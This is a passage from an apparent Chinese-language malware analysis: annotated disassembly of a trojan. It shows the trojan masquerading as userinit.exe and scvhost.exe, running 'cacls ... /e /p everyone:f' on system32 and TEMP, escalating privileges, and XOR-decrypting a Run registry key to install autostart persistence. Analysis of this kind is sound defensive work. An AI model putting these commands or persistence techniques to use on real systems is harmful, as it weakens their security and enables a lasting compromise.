
```
0040098C  |. 50            push    eax                              ; |dest

0040098D  |. E8 3E0D0000   call    <JMP.&MSVCRT.STRCAT>             ; \strcat

0012FBA8  43 3A 5C 57 49 4E 44 4F 57 53 5C 73 79 73 74 65  C:\WINDOWS\syste

0012FBB8  6D 33 32 5C 75 73 65 72 69 6E 69 74 2E 65 78 65  m32\userinit.exe

0040099A  |. 56            push    esi                              ; /BufSize

0040099B  |. 50            push    eax                              ; |PathBuffer

0040099C  |. 57            push    edi                              ; |hModule

0040099D  |. FF15 34044000 call    dword ptr [<&KERNEL32.GetModuleF>; \GetModuleFileNameA

0012FAA4  43 3A 5C 44 6F 63 75 6D 65 6E 74 73 20 61 6E 64  C:\Documents_and

0012FAB4  20 53 65 74 74 69 6E 67 73 5C 41 64 6D 69 6E 69   Settings\Admini

0012FAC4  73 74 72 61 74 6F 72 5C D7 C0 C3 E6 5C 65 58 5C  strator\桌面\eX\

0012FAD4  31 31 30 36 33 30 34 36 5F 78 65 65 78 2E 65 78  11063046_xeex.ex

0012FAE4  65 00                                            e.

004009A9  |. 50            push    eax          ; /s2 = "C:\WINDOWS\system32\userinit.exe"

004009AA  |. 8D85 E4FAFFFF lea     eax, dword ptr [ebp-51C]         ; |

004009B0  |. 50            push    eax          ; |s1 = "C:\Documents_and Settings\Administrator\",D7,"烂 eX\11063046_xeex.exe"

004009B1  |. FF15 F4044000 call    dword ptr [<&MSVCRT._stricmp>]   ; \_stricmp //比较自身是不是 userinit.exe

比较自身是不是 userinit.exe，如果是的话，则打开运行 explorer.exe 进程。

004009C3  |. 56            push    esi                              ; /n

004009C4  |. 8D85 F4FEFFFF lea     eax, dword ptr [ebp-10C]         ; |

004009CA  |. 57            push    edi                              ; |c

004009CB  |. 50            push    eax                              ; |s

004009CC  |. E8 B50C0000   call    <JMP.&MSVCRT.MEMSET>             ; \memset

004009D1  |. 83C4 0C       add     esp, 0C

004009D4  |. 8D85 F4FEFFFF lea     eax, dword ptr [ebp-10C]

004009DA  |. 56            push    esi                              ; /BufSize

004009DB  |. 50            push    eax                              ; |Buffer

004009DC  |. FF15 2C044000 call    dword ptr [<&KERNEL32.GetWindows>; \GetWindowsDirectoryA

004009E2  |. 8D85 F4FEFFFF lea     eax, dword ptr [ebp-10C]

004009E8  |. 68 48274000   push    00402748                         ; /src = "\explorer.exe"

004009ED  |. 50            push    eax                              ; |dest

004009EE  |. E8 DD0C0000   call    <JMP.&MSVCRT.STRCAT>             ; \strcat

004009F3  |. 59            pop     ecx

004009F4  |. 8D85 F4FEFFFF lea     eax, dword ptr [ebp-10C]

004009FA  |. 59            pop     ecx

004009FB  |. 6A 05         push    5

004009FD  |. 50            push    eax

004009FE  |. FFD3          call    ebx

00400A00  |. 68 E8030000   push    3E8                              ; /Timeout = 1000. ms

00400A05  |. FF15 28044000 call    dword ptr [<&KERNEL32.Sleep>]    ; \Sleep

然后通过 cacls 将%SystemRoot%\system32\目录和%TEMP%目录的访问权限设置为 everyone 完全控制

00400A0B  |> \8D85 F0FDFFFF lea     eax, dword ptr [ebp-210]

00400A11  |. 56            push    esi                              ; /BufSize

00400A12  |. 50            push    eax                              ; |Buffer

00400A13  |. FF15 68044000 call    dword ptr [<&KERNEL32.GetSystemD>; \GetSystemDirectoryA

00400A19  |. 8D85 F0FDFFFF lea     eax, dword ptr [ebp-210]

00400A1F  |. 50            push    eax                              ; /<%s>

00400A20  |. 8D85 ECFCFFFF lea     eax, dword ptr [ebp-314]         ; |

00400A26  |. 68 24274000   push    00402724                         ; |format = "cmd /c cacls %s /e /p everyone:f"

00400A2B  |. 50            push    eax                              ; |s

00400A2C  |. FF15 F0044000 call    dword ptr [<&MSVCRT.sprintf>]    ; \sprintf

00400A32  |. 83C4 0C       add     esp, 0C

00400A35  |. 8D85 ECFCFFFF lea     eax, dword ptr [ebp-314]

00400A3B  |. 57            push    edi

00400A3C  |. 50            push    eax

00400A3D  |. FFD3          call    ebx

00400A3F  |. 8D85 F0FDFFFF lea     eax, dword ptr [ebp-210]

00400A45  |. 50            push    eax                              ; /Buffer

00400A46  |. 56            push    esi                              ; |BufSize

00400A47  |. FF15 24044000 call    dword ptr [<&KERNEL32.GetTempPat>; \GetTempPathA

00400A4D  |. 8D85 F0FDFFFF lea     eax, dword ptr [ebp-210]

00400A53  |. 50            push    eax                              ; /<%s>

00400A54  |. 8D85 ECFCFFFF lea     eax, dword ptr [ebp-314]         ; |

00400A5A  |. 68 00274000   push    00402700                         ; |format = "cmd /c cacls ""%s"" /e /p everyone:f"

00400A5F  |. 50            push    eax                              ; |s

00400A60  |. FF15 F0044000 call    dword ptr [<&MSVCRT.sprintf>]    ; \sprintf

00400A66  |. 83C4 0C       add     esp, 0C

00400A69  |. 8D85 ECFCFFFF lea     eax, dword ptr [ebp-314]

00400A6F  |. 57            push    edi

00400A70  |. 50            push    eax

00400A71  |. FFD3          call    ebx

（10）获得注册表操作相关 API 函数虚拟地址,添加注册表自启动项

00400A73  |. E8 15FDFFFF   call    0040078D  //提权（前面我们已经分析过了）

00400A78  |. E8 43030000   call    00400DC0

00400DCF  |. BE 58284000   mov     esi, 00402858                    ;  ASCII "QMDVUCPG^^Okapmqmdv^^Uklfmuq^^AwppglvTgpqkml^^Pwl"

可能是加密的字符串，该字符串终究会解密，后面我们分析。

00400DEF  |. C645 F0 73    mov     byte ptr [ebp-10], 73                    ; |

00400DF3  |. 66:A5         movs    word ptr es:[edi], word ptr [esi]            ; |

00400DF5  |. C645 F1 63    mov     byte ptr [ebp-F], 63                         ; |

00400DF9  |. C645 F2 76    mov     byte ptr [ebp-E], 76                         ; |

00400DFD  |. C645 F3 68    mov     byte ptr [ebp-D], 68                         ; |

00400E01  |. C645 F4 6F    mov     byte ptr [ebp-C], 6F                         ; |

00400E05  |. C645 F5 73    mov     byte ptr [ebp-B], 73                         ; |

00400E09  |. C645 F6 74    mov     byte ptr [ebp-A], 74                         ; |

00400E0D  |. C645 F7 2E    mov     byte ptr [ebp-9], 2E                         ; |

00400E11  |. C645 F8 65    mov     byte ptr [ebp-8], 65                         ; |

00400E15  |. C645 F9 78    mov     byte ptr [ebp-7], 78                         ; |

00400E19  |. C645 FA 65    mov     byte ptr [ebp-6], 65                         ; |

0012FA80  73 63 76 68 6F 73 74 2E 65 78 65 00              scvhost.exe.

动态加载动态链接库 advapi32.dll，获取 RegCloseKey()、RegCreateKeyA()、RegSetValueExA()虚拟地址。

00400EC8  |. 50            push    eax                                          ; /s = "QMDVUCPG^^Okapmqmdv^^Uklfmuq^^AwppglvTgpqkml^^Pwl"

00400EC9  |. E8 BE070000   call    <JMP.&MSVCRT.STRLEN>                         ; \strlen

00400ECE  |. 59            pop     ecx

00400ECF  |. 50            push    eax

00400ED0  |. 8D85 6CFFFFFF lea     eax, dword ptr [ebp-94]

00400ED6  |. 50            push    eax

00400ED7  |. E8 75F8FFFF   call    00400751  //字符串解密函数

00400EDC  |. 83C4 0C       add     esp, 0C

00400751  /$  55            push    ebp

00400752  |. 8BEC          mov     ebp, esp

00400754  |. 56            push    esi

00400755  |. 57            push    edi

00400756  |. 8B7D 08       mov     edi, dword ptr [ebp+8]

00400759  |. 897D 08       mov     dword ptr [ebp+8], edi

0040075C  |. 8B75 08       mov     esi, dword ptr [ebp+8]

0040075F  |. B8 02000000   mov     eax, 2

00400764  |. 8B4D 0C       mov     ecx, dword ptr [ebp+C]

00400767  |>  3106          /xor     dword ptr [esi], eax

00400769  |. 46            |inc     esi

0040076A  |.^ E2 FB         \loopd   short 00400767
```
